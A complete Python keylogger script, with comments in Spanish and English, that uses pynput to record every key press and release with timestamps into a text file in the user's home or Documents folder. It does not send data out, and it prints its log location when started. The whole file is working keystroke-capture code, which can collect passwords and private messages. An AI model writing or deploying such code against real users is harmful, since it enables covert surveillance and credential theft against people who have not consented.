# Keylogger simple que registra las teclas presionadas y liberadas en un archivo de log
from pynput import keyboard
from datetime import datetime
import threading
import os
import sys

# Use Windows-friendly path in user's Documents folder
if sys.platform == "win32":
    LOG_FILE = os.path.join(os.path.expanduser("~"), "Documents", "keylog.txt")
else:
    LOG_FILE = os.path.join(os.path.expanduser("~"), "keylog.txt")

def on_press(key: keyboard.Key | keyboard.KeyCode) -> None:
    """Registra eventos de teclas presionadas en un archivo de log con marca de tiempo.

    ### Parámetros
    1. key : pynput.keyboard.Key | pynput.keyboard.KeyCode
        - Objeto que representa la tecla presionada.

    ### Retorna
    - None
        - No retorna ningún valor.

    ------

    Ejemplo:
        >>> on_press(key)
        # Registra: "2024-06-01 12:34:56.789123 - PRESSED - a"
        # o:        "2024-06-01 12:34:56.789123 - PRESSED - [Key.shift]"
    """
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            # Si la tecla tiene un carácter asociado, lo escribe en el archivo con la fecha y hora
            f.write(f"{datetime.now()} - PRESSED - {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            # Si la tecla no tiene carácter (por ejemplo, Shift, Ctrl), escribe el nombre de la tecla
            f.write(f"{datetime.now()} - PRESSED - [{key}]\n")
    except Exception as e:
        # Handle any file writing errors silently (Windows may have permission issues)
        pass

def on_release(key: keyboard.Key | keyboard.KeyCode) -> None:
    """Registra eventos de teclas liberadas en un archivo de log con marca de tiempo.

    ### Parámetros
    1. key : pynput.keyboard.Key | pynput.keyboard.KeyCode
        - Objeto que representa la tecla liberada.

    ### Retorna
    - None
        - No retorna ningún valor.

    ------

    Ejemplo:
        >>> on_release(key)
        # Registra: "2024-06-01 12:34:56.789123 - RELEASED - a"
        # o:        "2024-06-01 12:34:56.789123 - RELEASED - [Key.shift]"
    """
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            # Si la tecla tiene un carácter asociado, lo escribe en el archivo con la fecha y hora
            f.write(f"{datetime.now()} - RELEASED - {key.char}\n")
    except AttributeError:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            # Si la tecla no tiene carácter, escribe el nombre de la tecla
            f.write(f"{datetime.now()} - RELEASED - [{key}]\n")
    except Exception as e:
        # Handle any file writing errors silently
        pass

# Create the log file if it doesn't exist and show where it will be saved
try:
    os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True)
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"\n--- Keylogger started at {datetime.now()} ---\n")
    print(f"Keylogger started. Log file: {LOG_FILE}")
    print("Press Ctrl+C to stop the keylogger.")
except Exception as e:
    print(f"Error creating log file: {e}")
    sys.exit(1)

# Crea un listener para escuchar los eventos de teclado y asigna las funciones anteriores
listener = keyboard.Listener(on_press=on_press, on_release=on_release)

try:
    # Start the listener
    listener.start()
    print("Keylogger is running in the background...")
    
    # Keep the main thread alive
    listener.join()
except KeyboardInterrupt:
    print("\nKeylogger stopped by user.")
    listener.stop()
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        f.write(f"--- Keylogger stopped at {datetime.now()} ---\n")
except Exception as e:
    print(f"Error: {e}")
    listener.stop()
